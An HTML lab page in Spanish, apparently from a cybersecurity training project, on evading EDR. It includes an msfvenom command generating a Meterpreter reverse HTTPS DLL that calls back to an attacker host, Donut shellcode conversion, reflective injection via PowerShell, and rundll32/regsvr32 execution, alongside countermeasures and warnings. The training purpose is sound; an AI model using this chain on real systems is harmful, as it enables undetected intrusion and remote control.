
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Lab 25 ‚Äì Evasi√≥n de EDR mediante t√©cnicas de inyecci√≥n y ejecuci√≥n indirecta</title>
  <link rel="icon" href="/el-pergamino-digital/assets/favicon.png" type="image/png" />
  <style>
    :root { color-scheme: dark; }
    body {
      font-family: 'Segoe UI', sans-serif;
      background-color: #121212;
      color: #e0e0e0;
      margin: 0;
      padding: 2em;
      line-height: 1.6;
    }
    h1, h2 {
      color: #90caf9;
    }
    code {
      background-color: #1e1e1e;
      padding: 0.2em 0.4em;
      border-radius: 4px;
      font-family: Consolas, monospace;
    }
    pre {
      background-color: #1e1e1e;
      padding: 1em;
      border-radius: 6px;
      overflow-x: auto;
    }
    a {
      color: #90caf9;
    }
  </style>
</head>
<body>

  <h1>Lab 25 ‚Äì Evasi√≥n de EDR mediante t√©cnicas de inyecci√≥n y ejecuci√≥n indirecta</h1>
  <h2>Uso de t√©cnicas avanzadas para evadir soluciones de detecci√≥n y respuesta en endpoints (EDR)</h2>

  <section>
    <h2>1. Objetivo</h2>
    <p>Este laboratorio permite al analista ofensivo comprender c√≥mo funcionan las soluciones EDR y c√≥mo pueden ser evadidas mediante t√©cnicas como inyecci√≥n de shellcode, ejecuci√≥n indirecta, uso de procesos leg√≠timos y manipulaci√≥n de memoria. El objetivo es ejecutar c√≥digo malicioso sin ser detectado por soluciones modernas de defensa en endpoints.</p>
  </section>

  <section>
    <h2>2. Nivel de dificultad</h2>
    <p>Avanzado</p>
  </section>

  <section>
    <h2>3. Herramientas utilizadas</h2>
    <ul>
      <li><code>msfvenom</code></li>
      <li><code>Donut</code></li>
      <li><code>Invoke-ReflectivePEInjection</code></li>
      <li><code>Process Hacker</code></li>
      <li><code>Sysmon</code> y <code>Event Viewer</code> para monitoreo</li>
    </ul>
  </section>

  <section>
    <h2>4. Entorno de laboratorio</h2>
    <p>M√°quina atacante con Kali Linux, m√°quina v√≠ctima con Windows 10 y EDR activo (Microsoft Defender for Endpoint o similar), red virtual controlada, snapshot de restauraci√≥n.</p>
  </section>

  <section>
    <h2>5. Escenario</h2>
    <p>Un analista ofensivo necesita ejecutar un payload en una m√°quina protegida por EDR. El objetivo es utilizar t√©cnicas de inyecci√≥n y ejecuci√≥n indirecta para evitar la detecci√≥n y lograr la ejecuci√≥n del c√≥digo sin activar alertas.</p>
  </section>

  <section>
    <h2>6. Pasos previos</h2>
    <ul>
      <li>Generar un payload con <code>msfvenom</code> en formato DLL</li>
      <li>Convertir el DLL a shellcode con <code>Donut</code></li>
      <li>Preparar scripts de PowerShell para inyecci√≥n reflectiva</li>
      <li>Activar monitoreo con Sysmon y visor de eventos</li>
    </ul>
  </section>

  <section>
    <h2>7. Desarrollo</h2>
    <ol>
      <li>Generar DLL con <code>msfvenom</code>:
        <pre><code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f dll -o payload.dll</code></pre>
      </li>
      <li>Convertir a shellcode con Donut:
        <pre><code>donut payload.dll</code></pre>
      </li>
      <li>Inyectar el shellcode con PowerShell:
        <pre><code>Invoke-ReflectivePEInjection -PEBytes $shellcode -ProcID $pid</code></pre>
      </li>
      <li>Observar comportamiento del EDR y eventos generados</li>
      <li>Probar ejecuci√≥n indirecta mediante <code>rundll32</code> o <code>regsvr32</code></li>
      <li>Comparar detecci√≥n entre ejecuci√≥n directa e indirecta</li>
    </ol>
  </section>

    <section>
    <h2>8. Resultados esperados</h2>
    <ul>
      <li>Detecci√≥n del payload por el EDR en ejecuci√≥n directa</li>
      <li>Ejecuci√≥n exitosa mediante t√©cnicas de inyecci√≥n o ejecuci√≥n indirecta</li>
      <li>Reducci√≥n de alertas o eventos en el visor de eventos</li>
      <li>Captura de evidencias de ejecuci√≥n sin detecci√≥n</li>
    </ul>
  </section>

  <section>
    <h2>9. An√°lisis de resultados</h2>
    <p>Los EDR modernos detectan comportamientos sospechosos como inyecciones de memoria, uso de APIs cr√≠ticas o ejecuci√≥n de binarios no firmados. Al utilizar t√©cnicas como la inyecci√≥n reflectiva o el uso de procesos leg√≠timos, es posible evadir estas detecciones. El an√°lisis de eventos y alertas permite evaluar la eficacia de cada t√©cnica.</p>
  </section>

  <section>
    <h2>10. Conclusiones</h2>
    <p>La evasi√≥n de EDR requiere comprender c√≥mo funcionan sus mecanismos de detecci√≥n. Las t√©cnicas de ejecuci√≥n indirecta y manipulaci√≥n de memoria ofrecen ventajas t√°cticas, pero deben usarse con responsabilidad. Este laboratorio demuestra que incluso soluciones avanzadas pueden ser evadidas con t√©cnicas bien dise√±adas.</p>
  </section>

  <section>
    <h2>11. Medidas</h2>
    <ul>
      <li>Registrar eventos generados por cada t√©cnica</li>
      <li>Comparar ejecuci√≥n directa vs ejecuci√≥n indirecta</li>
      <li>Documentar procesos utilizados y su comportamiento</li>
    </ul>
  </section>

  <section>
    <h2>12. Contramedidas</h2>
    <ul>
      <li>Implementar reglas de detecci√≥n para procesos LOLBins (Living Off The Land Binaries)</li>
      <li>Correlacionar eventos de inyecci√≥n y ejecuci√≥n an√≥mala</li>
      <li>Aplicar restricciones de ejecuci√≥n por firma digital</li>
      <li>Utilizar EDR con capacidades de an√°lisis de memoria y comportamiento</li>
    </ul>
  </section>

  <section>
    <h2>13. Riesgos y advertencias</h2>
    <p>Estas t√©cnicas pueden comprometer gravemente la seguridad de un sistema si se aplican fuera de entornos controlados. No ejecutar en redes reales sin autorizaci√≥n. El uso indebido puede violar pol√≠ticas de seguridad o leyes locales.</p>
  </section>

  <section>
    <h2>14. Evidencias</h2>
    <p><em>Espacio reservado para capturas de pantalla de Sysmon, visor de eventos, ejecuci√≥n de payloads, scripts de inyecci√≥n y comportamiento del EDR.</em></p>
  </section>

  <section>
    <h2>15. Validaci√≥n cruzada</h2>
    <ul>
      <li><a href="https://attack.mitre.org/techniques/T1055/" target="_blank">MITRE ATT&CK T1055 ‚Äì Process Injection</a></li>
      <li><a href="https://attack.mitre.org/techniques/T1218/" target="_blank">MITRE ATT&CK T1218 ‚Äì Signed Binary Proxy Execution</a></li>
      <li><a href="https://www.cisecurity.org/controls/application-software-security" target="_blank">CIS Control 16 ‚Äì Application Software Security</a></li>
      <li><a href="https://csrc.nist.gov/publications/detail/sp/800-94/final" target="_blank">NIST SP 800-94 ‚Äì Guide to Intrusion Detection and Prevention Systems</a></li>
    </ul>
  </section>

  <section>
    <h2>16. Glosario asociado</h2>
    <ul>
      <li><strong>EDR:</strong> Endpoint Detection and Response, soluci√≥n que monitorea y responde a amenazas en endpoints</li>
      <li><strong>Inyecci√≥n de procesos:</strong> T√©cnica para insertar c√≥digo malicioso en procesos leg√≠timos</li>
      <li><strong>LOLBins:</strong> Binarios leg√≠timos del sistema utilizados con fines maliciosos</li>
      <li><strong>Shellcode:</strong> C√≥digo que se ejecuta directamente en memoria para controlar un sistema</li>
      <li><strong>Reflective Injection:</strong> T√©cnica que carga un binario en memoria sin escribirlo en disco</li>
    </ul>
  </section>

  <section>
    <h2>17. Preguntas de refuerzo</h2>
    <ol>
      <li>¬øQu√© diferencia hay entre un antivirus y un EDR?</li>
      <li>¬øQu√© t√©cnicas permiten evadir la detecci√≥n por EDR?</li>
      <li>¬øQu√© riesgos implica la ejecuci√≥n de c√≥digo en memoria?</li>
      <li>¬øQu√© es un LOLBin y c√≥mo puede usarse ofensivamente?</li>
      <li>¬øQu√© contramedidas pueden detectar inyecciones de procesos?</li>
    </ol>
  </section>

    <section>
    <h2>18. R√∫brica de evaluaci√≥n</h2>
    <ul>
      <li>‚úîÔ∏è Ejecuta correctamente t√©cnicas de evasi√≥n y captura evidencias</li>
      <li>‚úîÔ∏è Interpreta el comportamiento del EDR ante cada t√©cnica</li>
      <li>‚úîÔ∏è Relaciona t√©cnicas con est√°ndares y certificaciones</li>
      <li>‚úîÔ∏è Aplica medidas y contramedidas con criterio t√©cnico</li>
    </ul>
  </section>

  <section>
    <h2>19. Recursos complementarios</h2>
    <ul>
      <li><a href="https://github.com/TheWover/donut" target="_blank">Donut ‚Äì Shellcode Generator for PE Files</a></li>
      <li><a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank">PowerSploit ‚Äì Invoke-ReflectivePEInjection</a></li>
      <li><a href="https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/overview-endpoint-detection-response" target="_blank">Microsoft Defender for Endpoint ‚Äì EDR Overview</a></li>
      <li><a href="https://attack.mitre.org/" target="_blank">MITRE ATT&CK Framework</a></li>
    </ul>
  </section>

  <section>
    <h2>20. Cr√©ditos y licencia</h2>
    <p>Este laboratorio forma parte del proyecto <a href="https://pergamino-digital-ciberseguridad.blogspot.com/?m=1" target="_blank">El Pergamino Digital</a>. Su uso est√° autorizado √∫nicamente con fines educativos, respetando la trazabilidad editorial y la licencia CC BY-NC-SA 4.0.</p>
  </section>

  <section>
    <h2>21. Nivel de certificaci√≥n</h2>
    <p>Avanzado ‚Äì Alineado con CRTO, OSCE3 y eCPTXv2.</p>
  </section>

  <section>
    <h2>22. Mapa de integraci√≥n</h2>
    <ul>
      <li>üîó Contin√∫a el enfoque del <strong>Lab 24</strong> (Evasi√≥n de antivirus mediante ofuscaci√≥n)</li>
      <li>üß™ Refuerza el dominio de evasi√≥n en memoria y t√©cnicas contra EDR</li>
      <li>üéì Integra conceptos clave del simulador certificador: <em>EDR Evasion</em>, <em>Process Injection</em>, <em>Execution via LOLBins</em></li>
    </ul>
  </section>

</body>
</html>
